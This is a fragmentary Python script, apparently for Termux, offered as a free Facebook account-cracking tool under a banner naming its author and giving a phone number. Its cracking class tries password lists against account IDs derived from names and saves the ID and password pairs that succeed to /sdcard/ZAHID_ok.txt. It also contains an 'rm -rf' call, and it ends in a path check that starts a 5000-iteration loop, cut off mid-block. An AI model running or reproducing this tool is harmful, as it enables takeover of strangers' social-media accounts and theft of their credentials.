...
os.system("rm -rf .f2")
logo= f'''
        8888P    db    88  88 88 8888b.  
          dP    dPYb   88  88 88  8I  Yb 
         dP    dP__Yb  888888 88  8I  dY 
        d8888 dP""""Yb 88  88 88 8888Y"  

{50*"-"}
    Tool Version :        1.2
      Facebook   :     MR.ZAHID ALI
       Contact   :     03063849114 
         Tool    :      FREE
{50*"-"}'''
#--(Dark@Colours)---#
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[ZAHID] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[ZAHID-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/ZAHID_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/ZAHID_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/ZAHID' in datar:
        pass
else:
        for i in range(5000):
